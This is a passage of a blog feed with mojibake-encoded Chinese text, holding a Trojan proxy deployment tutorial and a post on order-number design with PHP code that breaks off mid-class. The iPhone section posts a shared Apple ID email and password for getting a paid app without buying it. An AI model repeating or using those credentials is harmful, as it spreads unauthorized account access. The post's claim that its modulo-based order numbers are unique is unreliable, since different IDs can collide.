class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ mkidr -<span class="selector-tag">p</span> /etc/json</span><br></pre></td></tr></table></figure><h4 id="b-é…ç½®config-json"><a href="#b-é…ç½®config-json" class="headerlink" title="b. é…ç½®config.json"></a>b. é…ç½®<code>config.json</code></h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"run_type"</span>: <span class="string">"server"</span>,</span><br><span class="line">    <span class="attr">"local_addr"</span>: <span class="string">"0.0.0.0"</span>,</span><br><span class="line">    <span class="attr">"local_port"</span>: <span class="number">443</span>,</span><br><span class="line">    <span class="attr">"remote_addr"</span>: <span class="string">"127.0.0.1"</span>,</span><br><span class="line">    <span class="attr">"remote_port"</span>: <span class="number">80</span>,</span><br><span class="line">    <span class="attr">"password"</span>: [</span><br><span class="line">        <span class="string">"password1"</span>,</span><br><span class="line">        <span class="string">"password2"</span></span><br><span class="line">    ],</span><br><span class="line">    <span class="attr">"log_level"</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="attr">"ssl"</span>: &#123;</span><br><span class="line">        "cert": "/path/to/certificate.crt", // è¯¥è·¯å¾„ä¸ºå®¹å™¨å†…è·¯å¾„</span><br><span class="line">        "key": "/path/to/private.key",</span><br><span class="line">        "key_password": "",</span><br><span class="line">        "cipher": "ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:DHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES256-GCM-SHA384",</span><br><span class="line">        "cipher_tls13": "TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384",</span><br><span class="line">        "prefer_server_cipher": true,</span><br><span class="line">        "alpn": [</span><br><span class="line">            <span class="string">"http/1.1"</span></span><br><span class="line">        ],</span><br><span class="line">        "reuse_session": true,</span><br><span class="line">        "session_ticket": false,</span><br><span class="line">        "session_timeout": 600,</span><br><span class="line">        "plain_http_response": "",</span><br><span class="line">        "curves": "",</span><br><span class="line">        "dhparam": ""</span><br><span class="line">    &#125;,</span><br><span class="line">    "tcp": &#123;</span><br><span class="line">        "prefer_ipv4": false,</span><br><span class="line">        "no_delay": true,</span><br><span class="line">        "keep_alive": true,</span><br><span class="line">        "reuse_port": false,</span><br><span class="line">        "fast_open": false,</span><br><span class="line">        "fast_open_qlen": 20</span><br><span class="line">    &#125;,</span><br><span class="line">    "mysql": &#123;</span><br><span class="line">        "enabled": false,</span><br><span class="line">        "server_addr": "127.0.0.1",</span><br><span class="line">        "server_port": 3306,</span><br><span class="line">        "database": "trojan",</span><br><span class="line">        "username": "trojan",</span><br><span class="line">        "password": ""</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="1-ç§‹æ°´é€¸å†°é•œåƒ"><a href="#1-ç§‹æ°´é€¸å†°é•œåƒ" class="headerlink" title="1. ç§‹æ°´é€¸å†°é•œåƒ"></a>1. ç§‹æ°´é€¸å†°é•œåƒ</h3><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -p <span class="number">443</span>:<span class="number">443</span> --name trojan \</span><br><span class="line">    -v <span class="regexp">/etc/</span><span class="string">trojan:</span><span class="regexp">/etc/</span>trojan \</span><br><span class="line">    -v <span class="regexp">/etc/</span>letsencrypt<span class="regexp">/archive/</span>example.<span class="string">com:</span><span class="regexp">/etc/</span>trojan<span class="regexp">/certs \   /</span>/ æ­¤å¤„éœ€ä¸`config.json`ä¸­çš„è·¯å¾„ä¸€è‡´</span><br><span class="line">    teddysun/trojan</span><br></pre></td></tr></table></figure><h3 id="2-å®˜æ–¹é•œåƒ"><a href="#2-å®˜æ–¹é•œåƒ" class="headerlink" title="2. å®˜æ–¹é•œåƒ"></a>2. å®˜æ–¹é•œåƒ</h3><p>é€šè¿‡æŸ¥çœ‹ Dockerfile æ–‡ä»¶ï¼Œæˆ‘ä»¬å‘ç°å®¹å™¨çš„å·¥ä½œç›®å½•æ˜¯<code>/config</code>ï¼Œå› æ­¤éœ€è¦å°†é…ç½®æ–‡ä»¶æ˜ å°„åˆ°å·¥ä½œç›®å½•ä¸‹</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="builtin-name">run</span> -d -p 443:443 --name trojan \</span><br><span class="line">    -v /etc/trojan:<span class="built_in">/config </span>\</span><br><span class="line">    -v /etc/letsencrypt/archive/example.com:/config/certs \</span><br><span class="line">    trojangfw/trojan</span><br></pre></td></tr></table></figure><p>å¦‚æœå‡ºç°å®¹å™¨å¼‚å¸¸é€€å‡ºçš„æƒ…å†µï¼Œå¯ä»¥é€šè¿‡ <code>docker ps</code> å‘½ä»¤æŸ¥çœ‹å®¹å™¨ IDï¼Œç„¶å<code>docker logs continer-id</code>æŸ¥çœ‹å¤±è´¥åŸå› ã€‚</p><p>ç”±äºå®¹å™¨æ— æ³•ç»‘å®šè½¯è¿æ¥æ–‡ä»¶ï¼Œæ‰€ä»¥éœ€è¦å°† certbot çš„ archive ä¸­çš„çœŸå®æ–‡ä»¶ç»‘å®šåˆ°å®¹å™¨ä¸­ï¼Œå®¹å™¨ä¸­éœ€è¦ä½¿ç”¨åˆ°çš„å…¬ç§é’¥åˆ†åˆ«æ˜¯<code>fullchain2.pem</code>å’Œ<code>privkey2.pem</code>ï¼Œå½“ certbot ç»­æœŸè¯ä¹¦æ—¶ï¼Œå› ä¸ºè¯ä¹¦åœ¨è¿è¡Œæ—¶æ˜¯åŠ è½½åˆ°å†…å­˜çš„ï¼Œæ‰€ä»¥éœ€è¦åŒäº‹é‡å¯ä¸‹ trojan å®¹å™¨ã€‚</p><p>å¦‚æœé…ç½®å®Œä»¥ä¸Šå†…å®¹åï¼Œä»ç„¶æ— æ³•æ­£å¸¸è¿æ¥ï¼Œæœ‰å¯èƒ½æ˜¯ IP æˆ–ç«¯å£è¢«å¢™ï¼Œå¯ç”¨ <a href="https://ping.pe" target="_blank" rel="noopener">https://ping.pe</a> æ£€æµ‹ä¸€ä¸‹ã€‚</p><h1 id="Windows-å®¢æˆ·ç«¯"><a href="#Windows-å®¢æˆ·ç«¯" class="headerlink" title="Windows å®¢æˆ·ç«¯"></a>Windows å®¢æˆ·ç«¯</h1><p>Windows å®¢æˆ·ç«¯åœ¨ <a href="https://github.com/trojan-gfw/trojan/releases" target="_blank" rel="noopener">https://github.com/trojan-gfw/trojan/releases</a> è·å–å³å¯ã€‚æ¥ä¸‹æ¥Chrome æˆ– Firefox éœ€è¦é…åˆ SwitchyOmega æ’ä»¶ä½¿ç”¨ï¼Œå…¶é…ç½®å†…å®¹å¦‚ä¸‹ï¼š</p><p>è®¾ç½®å…¨å±€ä»£ç†<br><img src="https://tva1.sinaimg.cn/large/006tNbRwly1gbjkucy7jwj30z90d440p.jpg" alt=""></p><p>è®¾ç½®è‡ªåŠ¨ä»£ç†<br><img src="https://tva1.sinaimg.cn/large/006tNbRwly1gbjkwu6kvdj31120dbjty.jpg" alt=""></p><p>è‡ªåŠ¨ä»£ç†æ¨¡å¼ä¸­æ·»åŠ è§„åˆ™åˆ—è¡¨ç½‘å€ <a href="https://raw.githubusercontent.com/gfwlist/gfwlist/master/gfwlist.txt" target="_blank" rel="noopener">https://raw.githubusercontent.com/gfwlist/gfwlist/master/gfwlist.txt</a> ï¼Œä»¥å®ç°æ™ºèƒ½åˆ†æµã€‚</p><h1 id="macOS-ç³»ç»Ÿä»£ç†è®¾ç½®"><a href="#macOS-ç³»ç»Ÿä»£ç†è®¾ç½®" class="headerlink" title="macOS ç³»ç»Ÿä»£ç†è®¾ç½®"></a>macOS ç³»ç»Ÿä»£ç†è®¾ç½®</h1><p><img src="https://tva1.sinaimg.cn/large/0082zybpgy1gc3okdtaixj30zl0u0tre.jpg" alt=""></p><h1 id="macOS-å®¢æˆ·ç«¯"><a href="#macOS-å®¢æˆ·ç«¯" class="headerlink" title="macOS å®¢æˆ·ç«¯"></a>macOS å®¢æˆ·ç«¯</h1><p>macOS ä½¿ç”¨ brew å®‰è£… Trojan</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="keyword">brew </span>tap trojan-gfw/homebrew-trojan</span><br><span class="line">$ <span class="keyword">brew </span>install trojan</span><br></pre></td></tr></table></figure><p>ä¸‹è½½æ­å»ºå®Œæˆçš„ä¸‹è½½åœ°å€ï¼Œå°†å…¶ä¸­çš„<code>config.json</code>ä¸<code>fullchain.cer</code>ä¸¤ä¸ªæ–‡ä»¶ç§»åŠ¨è‡³<code>/usr/local/etc/trojan/</code>ã€‚</p><p>ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤å¯åŠ¨ Trojan</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="keyword">brew </span>services start trojan-gfw/trojan/trojan</span><br></pre></td></tr></table></figure><p>è®¾ç½®æµè§ˆå™¨çš„ SwitchyOmega åŒä¸Šã€‚</p><h1 id="iPhone-å®¢æˆ·ç«¯"><a href="#iPhone-å®¢æˆ·ç«¯" class="headerlink" title="iPhone å®¢æˆ·ç«¯"></a>iPhone å®¢æˆ·ç«¯</h1><p>iPhone éœ€è¦å®‰è£… shadowrocketï¼Œè¯¥è½¯ä»¶ä¸ºç¾åŒºä»˜è´¹è½¯ä»¶ï¼Œå¯ä½¿ç”¨ä»¥ä¸‹å…±äº«è´¦å·ä¸‹è½½ã€‚è¯¥è´¦å·ä»…åœ¨åº”ç”¨å•†åº—ç™»å½•ï¼Œè¯·å‹¿åœ¨ iCloud ç™»å½•ã€‚<br>è´¦å·ï¼š<a href="mailto:iad37545@icloud.com" target="_blank" rel="noopener">iad37545@icloud.com</a><br>å¯†ç ï¼šAa112211</p><blockquote><p>è¯¥è´¦å·æ¥è‡ªäº <a href="https://github.com/shadowrocketHelp/help/wiki/å›½å¤–-appstore-id-è´¦å·åˆ†äº«" target="_blank" rel="noopener">https://github.com/shadowrocketHelp/help/wiki/å›½å¤–-appstore-id-è´¦å·åˆ†äº«</a></p></blockquote><p>ç„¶åé€‰æ‹© Trojan ç±»å‹ï¼Œå¹¶å¡«å†™å…¥æœåŠ¡é…ç½®ä¿¡æ¯å³å¯ã€‚</p><h1 id="Android-å®¢æˆ·ç«¯"><a href="#Android-å®¢æˆ·ç«¯" class="headerlink" title="Android å®¢æˆ·ç«¯"></a>Android å®¢æˆ·ç«¯</h1><p>å®‰å“ä½¿ç”¨<a href="https://github.com/PharosVip/Pharos-Android-Test/releases" target="_blank" rel="noopener">Pharos</a>æˆ–è€…<a href="https://github.com/trojan-gfw/igniter/releases" target="_blank" rel="noopener">igniter</a>å³å¯</p><hr><h1 id="å…¶å®ƒå‚è€ƒ"><a href="#å…¶å®ƒå‚è€ƒ" class="headerlink" title="å…¶å®ƒå‚è€ƒ"></a>å…¶å®ƒå‚è€ƒ</h1><ol><li><a href="https://github.com/Alvin9999/new-pac/wiki/%E8%87%AA%E5%BB%BAtrojan%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%95%99%E7%A8%8B" target="_blank" rel="noopener">è‡ªå»ºtrojanæœåŠ¡å™¨æ•™ç¨‹</a></li><li><a href="https://teddysun.com/" target="_blank" rel="noopener">ç§‹æ°´é€¸å†°</a></li><li><a href="https://www.atrandys.com/" target="_blank" rel="noopener">Arandyâ€™s</a></li><li><a href="https://trojan-tutor.github.io/2019/04/10/p41.html" target="_blank" rel="noopener">è‡ªå»ºæ¢¯å­æ•™ç¨‹ â€“ Trojan ç‰ˆæœ¬</a></li><li><a href="https://ssu.tw/index.php/archives/40/" target="_blank" rel="noopener">ä½¿ç”¨ Docker å¿«é€Ÿéƒ¨ç½² Trojan åè®®</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> æ—¥å¸¸æŠ€æœ¯ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> gfw </tag>
            
            <tag> proxy </tag>
            
            <tag> vpn </tag>
            
            <tag> ss </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>è®¢å•å·åº”è¯¥å¦‚ä½•è®¾è®¡</title>
      <link href="/post/how-to-design-order-number/"/>
      <url>/post/how-to-design-order-number/</url>
      
        <content type="html"><![CDATA[<p><img src="https://tva1.sinaimg.cn/middle/006tNbRwly1gaye6e6z98j30o10d9gmw.jpg" alt=""></p><a id="more"></a><h1 id="è®¢å•å·çš„åŸºæœ¬åŸåˆ™"><a href="#è®¢å•å·çš„åŸºæœ¬åŸåˆ™" class="headerlink" title="è®¢å•å·çš„åŸºæœ¬åŸåˆ™"></a>è®¢å•å·çš„åŸºæœ¬åŸåˆ™</h1><p>è®¢å•å·ä½œä¸ºäº¤æ˜“çš„é‡è¦æ ‡è¯†ï¼Œä¸€ä¸ªå¥½çš„è®¢å•å·åº”è¯¥æ»¡è¶³ä»¥ä¸‹è¦æ±‚ï¼š</p><ol><li>å”¯ä¸€æ€§ã€‚ç¡®ä¿è®¢å•å·çš„ç”Ÿæˆä¸ä¼šå‡ºç°é‡å¤ã€‚</li><li>å®‰å…¨æ€§ã€‚è®¢å•å·ä¸ä¼šæ³„éœ²ç”¨æˆ·ä¿¡æ¯ã€ä¸šåŠ¡è¿è¥çŠ¶å†µç­‰æ•æ„Ÿä¿¡æ¯ã€‚</li><li>å¯è¯»æ€§ã€‚å¥½çš„è®¢å•å·åº”è¯¥è¢«æ˜“äºé˜…è¯»ï¼Œå®¢æˆ·åé¦ˆæ—¶é™ä½ä¼ è¾¾é”™è¯¯æ¦‚ç‡ã€‚</li><li>æŒ‰éœ€åŒ…å«æ—¥å¸¸è¿ç»´ä¿¡æ¯ã€‚</li></ol><p>åŸºäºä»¥ä¸ŠåŸåˆ™è®¾è®¡çš„å”¯ä¸€æ ‡è¯†åœ¨ç”Ÿæ´»ä¸­æœ‰ä¸€ä¸ªå¾ˆå¥½çš„ä¾‹å­â€”â€”èº«ä»½è¯å·ï¼Œå…¶å…·ä½“çš„è®¾è®¡å¯æŸ¥çœ‹æˆ‘çš„å¦ä¸€ç¯‡æ–‡ç« <a href="https://blog.shixinyu.space/post/id-number-infos/">ä½ çš„èº«ä»½è¯å·ç éƒ½åŒ…å«äº†å“ªäº›ä¿¡æ¯ï¼Ÿ</a>ã€‚åœ¨èº«ä»½è¯å·ä¸­ï¼Œ18 ä½æ•°å­—åŒ…å«äº†åœ°åŒºã€ç”Ÿæ—¥ã€æ´¾å‡ºæ‰€ç¼–ç ã€æ€§åˆ«ã€æ ¡éªŒç­‰ä¿¡æ¯ï¼Œå¦‚æœæˆ‘ä»¬åœ¨è®¢å•å·ä¸­åŠ å…¥ä¸€äº›éæ•æ„Ÿçš„æ—¥å¸¸è¿ç»´ä¿¡æ¯ï¼Œå°†ä¼šæå¤§æå‡å·¥ä½œæ•ˆç‡ã€‚<br><img src="https://tva1.sinaimg.cn/large/006tNbRwly1gaya6etdstj30hs0a90tx.jpg" alt=""></p><h1 id="ç”µå•†å·¨å¤´è®¢å•å·"><a href="#ç”µå•†å·¨å¤´è®¢å•å·" class="headerlink" title="ç”µå•†å·¨å¤´è®¢å•å·"></a>ç”µå•†å·¨å¤´è®¢å•å·</h1><p>ç›®å‰ï¼Œæ·˜å®è®¢å•å·ä¸º 18 ä½ï¼Œæœ«6ä½ä¸ºéƒ¨åˆ†ç”¨æˆ· IDï¼Œ 2009 å¹´ 7 æœˆçš„æ·˜å®è®¢å•å·ä¸º 10 ä½ï¼›äº¬ä¸œè®¢å•å·ä¸º 12 ä½ï¼Œ2015 å¹´ 1 æœˆæ—¶è®¢å•ä¸º 10 ä½ã€‚å¯è§è®¢å•å·ä¹Ÿæ˜¯éšç€ä¸šåŠ¡ä¸æ–­å˜åŒ–çš„ï¼Œé‡è¦çš„æ˜¯å¦‚ä½•æ›´å¥½çš„æœåŠ¡äºä¸šåŠ¡ã€‚</p><p>ç¾å›¢æŠ€æœ¯å›¢é˜Ÿç›´æ¥å¼€æº<a href="https://tech.meituan.com/2017/04/21/mt-leaf.html" target="_blank" rel="noopener">Leaf è®¢å•å·ç”Ÿæˆå™¨</a>ï¼Œè¿™æ˜¯ä¸ºæ•°ä¸å¤šçš„å¤§æ•°æ®é‡ç”Ÿæˆè®¢å•è§£å†³æ–¹æ¡ˆçš„å¼€æºï¼Œæˆ‘ä»¬ä»ä¸­èƒ½å¾—åˆ°å¾ˆå¤šçš„å€Ÿé‰´ã€‚</p><h1 id="å¸¸è§è®¾è®¡"><a href="#å¸¸è§è®¾è®¡" class="headerlink" title="å¸¸è§è®¾è®¡"></a>å¸¸è§è®¾è®¡</h1><ol><li>å¹´æœˆæ—¥æ—¶åˆ†ç§’ + ç”¨æˆ· ID</li><li>å¹´æœˆæ—¥æ—¶åˆ†ç§’ + éšæœºæ•° + æ ¡éªŒç </li><li>éšæœºè®¢å•å·</li><li>æ ¹æ®ä¸šåŠ¡ä¿¡æ¯åŠ å¯†å¤„ç†ç”Ÿæˆ</li><li>æ ¹æ®ä¸šåŠ¡è¿è¥æƒ…å†µç”Ÿæˆ</li></ol><p>åœ¨è®¾è®¡è®¢å•å·æ—¶ï¼Œæœ‰äº›å…·å¤‡å”¯ä¸€æ€§çš„ ID æ˜¯å¾ˆå¥½çš„é˜²å†²çªæ‰‹æ®µï¼Œå¦‚ç”¨æˆ· IDã€æ—¶é—´æˆ³ç­‰ï¼Œä½†ç›´æ¥åŠ å…¥åˆä¼šæš´éœ²æ•æ„Ÿä¿¡æ¯ï¼Œå› æ­¤å¯ä»¥æ··å…¥å–æ¨¡ã€ç§»ä½ã€å¼‚æˆ–ã€æ ¡éªŒä½ç­‰åŠ å¯†æ•æ„Ÿä¿¡æ¯ï¼ŒåŒæ—¶é˜²æ­¢è®¢å•å·è¢«æ„é€ ã€‚</p><p>æœ€åï¼Œæ²¡æœ‰é“¶å¼¹ï¼Œæ ¹æ®ä¸šåŠ¡çš„å®é™…æƒ…å†µæŒ‰éœ€è®¾è®¡ï¼Œåˆé€‚çš„æ‰æ˜¯æœ€å¥½çš„ã€‚</p><h2 id="â€”-2020-04-24-æ›´-â€”"><a href="#â€”-2020-04-24-æ›´-â€”" class="headerlink" title="â€” 2020.04.24 æ›´ â€”"></a><center>â€” 2020.04.24 æ›´ â€”</center></h2><p>åŸºäºä»¥ä¸Šçš„è®¢å•è®¾è®¡åŸåˆ™ï¼Œæˆ‘ä»¬å‡è®¾ç°åœ¨æœ‰è¿™æ ·ä¸€ä¸ªè®¢å•åœºæ™¯ï¼šç”¨æˆ· ID ä¸º 10000000 èµ·å§‹çš„è‡ªå¢ IDï¼Œä»»åŠ¡ ID ä¸º 1000 èµ·å§‹çš„è‡ªå¢ IDï¼Œä¸€ä¸ªä»»åŠ¡åªèƒ½è¢«æ¯ä¸ªç”¨æˆ·é¢†å–ä¸€æ¬¡ï¼Œæˆ‘ä»¬å¯¹è®¢å•å·æœ‰ä»¥ä¸‹è¦æ±‚ï¼š</p><ol><li>å”¯ä¸€æ€§</li><li>è®¢å•å·ä¸­ä½“ç°ä¸‹å•æ—¥æœŸ</li><li>è®¢å•å·ä¸èƒ½æ³„éœ²ä¸šåŠ¡ä¿¡æ¯ï¼Œå¦‚æ¯æ—¥è®¢å•é‡ã€ç”¨æˆ· ID ç­‰</li><li>å…·å¤‡æ ¡éªŒé˜²ä¼ªåŠŸèƒ½</li><li>è®¢å•å·ä¸ºçº¯æ•°å­—</li><li>åœ¨æ»¡è¶³ä¸šåŠ¡éœ€æ±‚çš„å‰æä¸‹å°½å¯èƒ½ç®€çŸ­ï¼Œé•¿åº¦åœ¨ 10 ~ 14 ä½</li></ol><p>æ ¹æ®è®¢å•å·çš„è¦æ±‚ï¼Œæˆ‘ä»¬è®¾è®¡å‡ºä»¥ä¸‹æ ¼å¼çš„è®¢å•å·ï¼š</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">YYMMDD</span>(<span class="number">6</span>)/<span class="title">uid</span>(<span class="number">2</span>)/<span class="title">tid</span>(<span class="number">2</span>)/<span class="title">checksum</span>(<span class="number">1</span>)</span></span><br></pre></td></tr></table></figure><p>è®¢å•å·é•¿åº¦å…± 11 ä½ï¼Œå‰ 6 ä½ä¸ºä¸‹å•æ—¥æœŸï¼ˆå¹´ä»½ç”¨ä¸¤ä½è¡¨ç¤ºå·²ç»è¶³å¤Ÿï¼‰ï¼Œç”¨æˆ· ID ä¸ä»»åŠ¡ ID å–æ¨¡è¿ç®—ç»“æœå„ 2 ä½ï¼Œæ ¡éªŒä½ 1 ä½ï¼ˆç”¨äºé˜²æ­¢è®¢å•å·çš„ä¼ªé€ ï¼‰ã€‚æ¯å¤©çš„è®¢å•å®¹é‡ä¸º 10 ä¸‡ï¼Œå¦‚æœä¸šåŠ¡å¢é•¿å¾ˆå¿«ï¼Œå¯ä»¥æŒ‰éœ€æ‰©å®¹ã€‚å®ç°ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OrderNumber</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * è®¢å•å·éæ ¡éªŒä½æƒé‡</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> array</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">const</span> WEIGHT = [<span class="number">5</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">3</span>, <span class="number">8</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">4</span>, <span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * æ ¡éªŒä½æ˜ å°„å…³ç³»</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> array</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">const</span> CHECK_SUM_MOD_MAP = [<span class="number">6</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">7</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">3</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * ç”¨æˆ· ID å–æ¨¡æ•°</span></span><br><span class="line"><span class="comment">     * ä¸ºäº†ä¿è¯å–æ¨¡ç»“æœä¸ºä¸¤ä½æ•°ï¼Œå› æ­¤å–æ¨¡æ•°é€‰å– 100 ä»¥å†…çš„è´¨æ•°</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">const</span> USER_ID_MOD_NUM = <span class="number">97</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * ä»»åŠ¡ ID å–æ¨¡æ•°</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">const</span> TASK_ID_MOD_NUM = <span class="number">53</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * æ ¡éªŒä½å–æ¨¡æ•°</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">const</span> CHECK_SUM_MOD_NUM = <span class="number">11</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * ç”Ÿæˆè®¢å•å·</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> $userId string|int ç”¨æˆ· ID</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> $taskId string|int ä»»åŠ¡ ID</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> string è®¢å•å·</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">generate</span><span class="params">($userId, $taskId)</span>: <span class="title">string</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $date = date(<span class="string">'ymd'</span>);</span><br><span class="line">        $user = str_pad($userId % <span class="keyword">self</span>::USER_ID_MOD_NUM, <span class="number">2</span>, <span class="string">'0'</span>, STR_PAD_LEFT);</span><br><span class="line">        $task = str_pad($taskId % <span class="keyword">self</span>::TASK_ID_MOD_NUM, <span class="number">2</span>, <span class="string">'0'</span>, STR_PAD_LEFT);</span><br><span class="line"></span><br><span class="line">        $checksum = <span class="keyword">$this</span>-&gt;getCheckSum($date . $user . $task);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $date . $user . $task . $checksum;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * è·å–è®¢å•å·æ ¡éªŒä½</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> $orderNumber string è®¢å•å·</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> int</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">getCheckSum</span><span class="params">($orderNumber)</span>: <span class="title">int</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $sum = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> ($index = <span class="number">0</span>; $index &lt; <span class="number">10</span>; $index++) &#123;</span><br><span class="line">            $sum += $orderNumber[$index] * <span class="keyword">self</span>::WEIGHT[$index];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">self</span>::CHECK_SUM_MOD_MAP[$sum % <span class="keyword">self</span>::CHECK_SUM_MOD_NUM];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * æ ¡éªŒè®¢å•å·</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> $orderNumber string</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> bool</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span 